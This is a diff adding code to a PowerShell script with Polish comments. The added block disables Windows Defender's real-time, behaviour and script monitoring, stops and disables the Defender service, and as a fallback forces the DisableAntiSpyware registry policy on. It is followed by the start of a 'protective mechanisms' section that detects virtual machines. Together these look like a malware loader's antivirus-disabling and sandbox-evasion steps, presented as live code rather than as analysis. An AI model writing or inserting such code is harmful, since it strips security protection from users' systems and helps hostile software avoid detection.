@@ -1,3 +1,15 @@
+# Natychmiastowe wyłączenie Windows Defender
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
+    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Stop
+    Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop
+    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
+    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
+} catch {
+    # Awaryjne wyłączenie przez usunięcie klucza rejestru
+    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -ErrorAction SilentlyContinue
+    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force
+}
 #region Mechanizmy Ochronne
 # Wykrywanie środowisk wirtualnych
 $isVM = $false
